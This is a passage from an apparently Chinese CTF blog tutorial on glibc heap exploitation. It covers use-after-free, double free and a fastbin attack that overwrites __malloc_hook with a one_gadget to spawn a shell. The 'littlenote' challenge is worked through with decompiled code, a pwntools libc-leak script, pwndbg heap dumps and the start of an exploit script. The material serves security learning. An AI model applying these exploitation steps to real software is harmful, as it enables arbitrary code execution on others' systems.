    p1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"hahahah\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//传参</span>
    <span class="token function">free</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//free后指针没有置0</span>
    f_ptr <span class="token operator">*</span>p2 <span class="token operator">=</span> <span class="token punctuation">(</span>f_ptr<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//再次申请相同大小堆块</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"p2 addr:%p\n"</span><span class="token punctuation">,</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>
    p2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>getshell<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//使用p1数组指针指向getshell函数</span>
    p1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>编译</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>gcc -g uaf.c -o uaf
</code></pre><p>运行</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ios@ios:~$ ./uaf
p1 addr:0x24a0010
hahahah
p2 addr:0x24a0010
$ <span class="token function">ls</span>
Desktop    Downloads         Music     Public     te        test.c  uaf.c
Documents  examples.desktop  Pictures  pwntools  Templates  uaf     Videos
$
</code></pre>
<h3 id="Double-Free"><a href="#Double-Free" class="headerlink" title="Double Free"></a>Double Free</h3><p>原理</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>堆块释放后对指针没有清空 出现迷途指针、导致可以再次释放该堆块
</code></pre><p> 在glibc源码中有这样的处理</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span><span class="token function">fastbin_index</span> <span class="token punctuation">(</span><span class="token function">chunksize</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> idx<span class="token comment" spellcheck="true">// 判断大小是否满足 fastbin相应bin的大小要求</span>
</code></pre>
<pre><code>Fastbin 在分配 chunk 时，只检查 p-&gt;size&amp;0xfffffffffffff000是否满足等于的 fastbin的大小 ，而且不检查指针是否对齐。所以我们只要找到 size 为 fastbin 的范围，然后修改 位于 fastbin 的 chunk 的 fd 到这 ，分配几次以后，就可以分配到这个位置
&lt;p class=&quot;code-caption&quot; data-lang=&quot;&quot; data-line_number=&quot;frontend&quot; data-trim_indent=&quot;backend&quot; data-label_position=&quot;outer&quot; data-labels_left=&quot;&quot; data-labels_right=&quot;&quot; data-labels_copy=&quot;&quot;&gt;&lt;span class=&quot;code-caption-label&quot;&gt;&lt;/span&gt;&lt;/p&gt;
</code></pre><p>改malloc__hook利用方式</p>
<p><strong>__malloc_hook - 0x23 + 0x8</strong> 的 内容为 <strong>0x000000000000007f</strong> ， 可以用来绕过 <code>fastbin</code> 分配的检查</p>
<ul>
<li><strong>Fastbin Attack</strong> 开始，分配两次，可以得到 <strong>最后一个堆块地址 = __malloc_hook -0x13</strong></li>
<li>再次添加’a’*0x13+onegadget 触发malloc__hook跳转到onegadget地址</li>
</ul>
<h4 id="例题-铁三littlenote"><a href="#例题-铁三littlenote" class="headerlink" title="例题 铁三littlenote"></a>例题 铁三littlenote</h4><p>读源码</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"1. add a note"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"2. show a note"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"3. delete a note"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"4. exit"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Your choice:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>可以得知该程序主要有三个功能 </p>
<h4 id="add"><a href="#add" class="headerlink" title="add"></a>add</h4><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">addnote</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  v4 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span>notenum <span class="token operator">></span> <span class="token number">0xF</span> <span class="token punctuation">)</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"FULL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v0 <span class="token operator">=</span> notenum<span class="token punctuation">;</span>
  note<span class="token punctuation">[</span>v0<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x60uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Enter your note"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> note<span class="token punctuation">[</span>notenum<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0x60uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Want to keep your note?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">7uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> buf <span class="token operator">==</span> <span class="token number">78</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"OK,I will leave a backup note for you"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>note<span class="token punctuation">[</span>notenum<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    v1 <span class="token operator">=</span> notenum<span class="token punctuation">;</span>
    note<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x20uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token operator">++</span>notenum<span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Done"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v4<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>可以看到固定分配malloc size为0x60 可以考虑 Fastbin Attack</p>
<p>添加堆块操作</p>
<h4 id="show"><a href="#show" class="headerlink" title="show"></a>show</h4><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">shownote</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>

  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Which note do you want to show?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">_isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%u"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span>notenum <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> note<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span>
      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>note<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Done"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">{</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Out of bound!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v2<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>打印当前指针所指堆块中的内容</p>
<h4 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h4><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">freenote</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>

  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Which note do you want to delete?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">_isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%u"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span>notenum <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> note<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span>
      <span class="token function">free</span><span class="token punctuation">(</span>note<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//漏洞点</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Done"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">{</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Out of bound!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v2<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>释放堆块 但是free后 指针没有清空 导致产生迷途指针 可以导致double free 以及uaf 利用</p>
<p>首先调试分析 leak libc_base</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span>
p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./littlenote"</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"your note"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"keep your note?"</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"show?"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"delete?"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>

add<span class="token punctuation">(</span><span class="token string">"aaa"</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'N'</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'Y'</span><span class="token punctuation">)</span>
show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
leak_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
</code></pre>
<pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Waiting <span class="token keyword">for</span> debugger: Done
<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0x4f bytes:
    00000000  0a fb a4 6f  89 7f 0a 44  6f 6e 65 0a  31 2e 20 61  │···o│···D│one·│1. a│
    00000010  64 64 20 61  20 6e 6f 74  65 0a 32 2e  20 73 68 6f  │dd a│ not│e·2.│ sho│
    00000020  77 20 61 20  6e 6f 74 65  0a 33 2e 20  64 65 6c 65  │w a │note│·3. │dele│
    00000030  74 65 20 61  20 6e 6f 74  65 0a 34 2e  20 65 78 69  │te a│ not│e·4.│ exi│
    00000040  74 0a 59 6f  75 72 20 63  68 6f 69 63  65 3a 0a     │t·Yo│ur c│hoic│e:·│
    0000004f
0x7f896fa4fb0a

<span class="token operator">&lt;</span>p class<span class="token operator">=</span><span class="token string">"code-caption"</span> data-lang<span class="token operator">=</span><span class="token string">""</span> data-line_number<span class="token operator">=</span><span class="token string">"frontend"</span> data-trim_indent<span class="token operator">=</span><span class="token string">"backend"</span> data-label_position<span class="token operator">=</span><span class="token string">"outer"</span> data-labels_left<span class="token operator">=</span><span class="token string">""</span> data-labels_right<span class="token operator">=</span><span class="token string">""</span> data-labels_copy<span class="token operator">=</span><span class="token string">""</span><span class="token operator">></span><span class="token operator">&lt;</span>span class<span class="token operator">=</span><span class="token string">"code-caption-label"</span><span class="token operator">></span><span class="token operator">&lt;</span>/span<span class="token operator">></span><span class="token operator">&lt;</span>/p<span class="token operator">></span>
</code></pre>
<p>在gdb中查看当前heap情况</p>
<pre class=" language-bash"><code class="language-bash">pwndbg<span class="token operator">></span> heap
0x55da16209000 FASTBIN <span class="token punctuation">{</span>
  prev_size <span class="token operator">=</span> 0, 
  size <span class="token operator">=</span> 113, 
  fd <span class="token operator">=</span> 0x7f896fa4fb0a <span class="token operator">&lt;</span>__realloc_hook+2<span class="token operator">></span>,  
  bk <span class="token operator">=</span> 0x7f896fa4fbd8 <span class="token operator">&lt;</span>main_arena+184<span class="token operator">></span>, 
  fd_nextsize <span class="token operator">=</span> 0x0, 
  bk_nextsize <span class="token operator">=</span> 0x0
<span class="token punctuation">}</span>
0x55da16209070 FASTBIN <span class="token punctuation">{</span>
  prev_size <span class="token operator">=</span> 112, 
  size <span class="token operator">=</span> 49, 
  fd <span class="token operator">=</span> 0x0, 
  bk <span class="token operator">=</span> 0x0, 
  fd_nextsize <span class="token operator">=</span> 0x0, 
  bk_nextsize <span class="token operator">=</span> 0x0
<span class="token punctuation">}</span>
0x55da162090a0 PREV_INUSE <span class="token punctuation">{</span>
  prev_size <span class="token operator">=</span> 0, 
  size <span class="token operator">=</span> 4113, 
  fd <span class="token operator">=</span> 0xa31 <span class="token operator">&lt;</span>frame_dummy+17<span class="token operator">></span>, 
  bk <span class="token operator">=</span> 0x0, 
  fd_nextsize <span class="token operator">=</span> 0x0, 
  bk_nextsize <span class="token operator">=</span> 0x0
<span class="token punctuation">}</span>
0x55da1620a0b0 PREV_INUSE <span class="token punctuation">{</span>
  prev_size <span class="token operator">=</span> 0, 
  size <span class="token operator">=</span> 130897, 
  fd <span class="token operator">=</span> 0x0, 
  bk <span class="token operator">=</span> 0x0, 
  fd_nextsize <span class="token operator">=</span> 0x0, 
  bk_nextsize <span class="token operator">=</span> 0x0
<span class="token punctuation">}</span>
pwndbg<span class="token operator">></span>
</code></pre>
<p>看到 leak出的地址为 fd = 0x7f896fa4fb0a &lt;__realloc_hook+2&gt;,</p>
<p>所以我们可以leak出__realloc_hook地址 从而计算得到libc_base 、malloc_hook_addr</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">__realloc_hook_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">2</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>__realloc_hook_addr<span class="token punctuation">)</span>
libc_base <span class="token operator">=</span>__realloc_hook_addr<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__realloc_hook'</span><span class="token punctuation">]</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span>
malloc_addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span><span class="token operator">+</span>libc_base
<span class="token keyword">print</span> <span class="token string">"malloc_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>malloc_addr<span class="token punctuation">)</span>
</code></pre>
<p>当然要利用double还需要绕过 main_arean是否指向向了原来的一个chunk 这个检查。这个就非常容易了，只需要free(p1);free(p2);free(p1)就可以绕过了</p>
<p>绕过后 fastbin list中会多指向一个我们的fake chunk 此时就可以实现任意地址写入了</p>
<p> onegadget </p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ios@ios:~$ ldd littlenote
    linux-vdso.so.1 <span class="token operator">=</span><span class="token operator">></span>  <span class="token punctuation">(</span>0x00007ffe0e13f000<span class="token punctuation">)</span>
    libc.so.6 <span class="token operator">=</span><span class="token operator">></span> /lib/x86_64-linux-gnu/libc.so.6 <span class="token punctuation">(</span>0x00007fccaf9d7000<span class="token punctuation">)</span>
    /lib64/ld-linux-x86-64.so.2 <span class="token punctuation">(</span>0x00007fccaffa4000<span class="token punctuation">)</span>
ios@ios:~$ one_gadget /lib/x86_64-linux-gnu/libc.so.6
0x45216    execve<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span>, rsp+0x30, environ<span class="token punctuation">)</span>
constraints:
  rax <span class="token operator">==</span> NULL

0x4526a    execve<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span>, rsp+0x30, environ<span class="token punctuation">)</span>
constraints:
  <span class="token punctuation">[</span>rsp+0x30<span class="token punctuation">]</span> <span class="token operator">==</span> NULL

0xf02a4    execve<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span>, rsp+0x50, environ<span class="token punctuation">)</span>
constraints:
  <span class="token punctuation">[</span>rsp+0x50<span class="token punctuation">]</span> <span class="token operator">==</span> NULL

0xf1147    execve<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span>, rsp+0x70, environ<span class="token punctuation">)</span>
constraints:
  <span class="token punctuation">[</span>rsp+0x70<span class="token punctuation">]</span> <span class="token operator">==</span> NULL
ios@ios:~$
</code></pre>
<p>使用one_gadget 当然还要满足一些其他条件 例如</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">0xf02a4    execve<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span>, rsp+0x50, environ<span class="token punctuation">)</span>
constraints:
  <span class="token punctuation">[</span>rsp+0x50<span class="token punctuation">]</span> <span class="token operator">==</span> NULL
</code></pre>
<p>需要满足rsp+0x50位置的值为0 否则无法成功利用 。需要重新寻找其他满足条件的one gadget</p>
<p>fastbin size检查绕过</p>
<p>在__malloc_hook - 0x23+0x8 处有合适的 size 0x7f </p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">pwndbg<span class="token operator">></span> x/4gx 0x7fda4f7ccb10
0x7fda4f7ccb10 <span class="token operator">&lt;</span>__malloc_hook<span class="token operator">></span>:    0x0000000000000000    0x0000000000000000
0x7fda4f7ccb20 <span class="token operator">&lt;</span>main_arena<span class="token operator">></span>:    0x0000000000000000    0x0000000000000000
pwndbg<span class="token operator">></span> x/4gx 0x7fda4f7ccb10-0x23
0x7fda4f7ccaed <span class="token operator">&lt;</span>_IO_wide_data_0+301<span class="token operator">></span>:    0xda4f7cb260000000    0x000000000000007f
0x7fda4f7ccafd:    0xda4f48de20000000    0xda4f48da0000007f
pwndbg<span class="token operator">></span> x/4gx 0x7fda4f7ccb10-0x23+0x8
0x7fda4f7ccaf5 <span class="token operator">&lt;</span>_IO_wide_data_0+309<span class="token operator">></span>:    0x000000000000007f    0xda4f48de20000000
0x7fda4f7ccb05 <span class="token operator">&lt;</span>__memalign_hook+5<span class="token operator">></span>:    0xda4f48da0000007f    0x000000000000007f
pwndbg<span class="token operator">></span>
</code></pre>
<p>所以构造当前可控fd为 __malloc_hook - 0x23即可</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">pwndbg<span class="token operator">></span> fastbin
fastbins
0x20: 0x0
0x30: 0x5614c91bb070 ◂— 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x5614c91bc120 —▸ 0x5614c91bc0b0 —▸ 0x7fda4f7ccaed <span class="token punctuation">(</span>_IO_wide_data_0+301<span class="token punctuation">)</span> ◂— 0xda4f48de20000000
0x80: 0x0
pwndbg<span class="token operator">></span>
</code></pre>
<p>可以看到当前fastbin 0x70大小的堆块 两次分配0x70堆块就可以分配到malloc_hook(0x60size+堆头0x10)</p>
<p>此时堆块addr=malloc_hook-0x13</p>
<p>所以再次申请堆块填充’a’*13+one_gadget 即可成功执行malloc hook 返回到one_gadget地址 拿到shell</p>
<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span>
p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./littlenote"</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"your note"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"keep your note?"</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"show?"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>

